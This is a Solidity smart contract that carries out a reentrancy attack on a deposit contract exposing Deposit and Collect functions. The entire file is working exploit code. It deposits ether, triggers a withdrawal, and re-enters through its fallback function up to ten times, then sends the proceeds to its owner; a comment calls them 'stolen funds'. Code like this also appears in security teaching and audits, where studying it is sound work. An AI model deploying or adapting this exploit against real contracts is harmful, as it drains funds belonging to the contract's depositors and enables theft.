pragma solidity ^0.4.19;

interface IAccuralDeposit {
    function Deposit() external payable;
    function Collect(uint _am) external payable;
}

contract ReentrancyAttacker {
    IAccuralDeposit public vulnerable;
    address public owner;
    uint public attackAmount = 1 ether;
    uint public count;

    constructor(address _target) public {
        vulnerable = IAccuralDeposit(_target);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= attackAmount);
        // Step 1: Deposit
        vulnerable.Deposit.value(attackAmount)();
        // Step 2: Start exploit
        vulnerable.Collect(attackAmount);
    }

    // Step 3: Re-enter here
    function() public payable {
        if (address(vulnerable).balance >= attackAmount && count < 10) {
            count++;
            vulnerable.Collect(attackAmount);
        } else {
            owner.transfer(address(this).balance); // drain stolen funds
        }
    }
}

